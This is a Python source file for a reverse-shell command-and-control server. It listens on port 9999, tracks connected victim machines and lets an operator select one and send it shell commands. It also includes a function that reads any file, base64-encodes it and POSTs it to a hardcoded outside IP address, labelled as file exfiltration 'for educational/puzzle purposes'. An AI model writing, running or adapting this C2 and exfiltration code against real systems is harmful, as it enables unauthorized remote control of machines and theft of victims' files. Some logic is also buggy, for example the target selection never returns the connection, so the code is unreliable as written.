import socket
import sys
import threading
import time
import requests
import base64
import os
from queue import Queue

NUMBER_OF_THREADS = 2

# 1st thread = listen for connection and  accept connection
# 2nd thread = Send commands to the client and handle connection with existing client
JOB_NUMBER = [1,2]
queue = Queue()
all_connection = []
all_address = []

# Creating a Socket
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation error: "+ str(msg))

# Binding the sockets and listening for connections


def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding errror: " + str(msg) + "\n" + "Retrying...")
        bind_socket()

# Handling connection from Multiple clients and saving to a list
# Closing previous connections when server.py file is restarted

def accepting_connection():
    for c in all_connection:
        c.close()

    del all_connection[:]
    del all_address[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1) #preventing timeout

            all_connection.append(conn)
            all_address.append(address)

            print("Connection has been established :" + address[0])

        except:
            print("Error accepting connections")


def start_turtle():
    while True:
        cmd = input('turtle> ')
        if cmd == 'list':
            list_connection()

        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        else:
            print("command not recnognized")

# Display all current active connections with the client
def list_connection():
    results = ''

    selectID = 0
    for i,conn in enumerate(all_connection):
        try:
            conn.send(str.encode(' '))
            conn.recv(201480)
        except:
            del all_connection[i]
            del all_address[i]
            continue

        results = str(i) + "  " + str(all_address[i][0]) + "  " + str(all_address[i][1]) + "\n"

    print("-----Client-----" + "\n" + results)

# Selecting the target
def get_target(cmd):
    try:
        target = cmd.replace('select ','') #target = ID
        target = int(target)
        conn = all_connection[target]
        print("You care now connected to: " + str(all_address[target][0]))
        print(str(all_address[target][0] + ">",end=""))

    except:
        print("Selection not valid")
        return None
    
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                conn.close()
                s.close()
                sys.exit()
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(1024), "utf-8")
                print(client_response, end="")
        except:
            print("Error sending commands")
            break

def exfil_file_b64(file_path):
    """
    File exfiltration using base64 encoding over HTTP
    For educational/puzzle purposes only
    """
    target_ip = "203.0.113.17"  # Hardcoded target IP
    target_url = f"http://{target_ip}:8080/data"
    
    try:
        if not os.path.exists(file_path):
            print(f"File {file_path} not found")
            return False
            
        with open(file_path, 'rb') as file:
            file_data = file.read()
            encoded_data = base64.b64encode(file_data).decode()
            
        payload = {
            'filename': os.path.basename(file_path),
            'data': encoded_data
        }
        
        response = requests.post(target_url, json=payload, timeout=10)
        
        if response.status_code == 200:
            print(f"File {file_path} successfully exfiltrated")
            return True
        else:
            print(f"Exfiltration failed: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"Error during exfiltration: {e}")
        return False
    
# Create worker threads
def create_worker():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x==2:
            start_turtle()
        
        queue.task_done()

def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()

create_worker()
create_jobs()
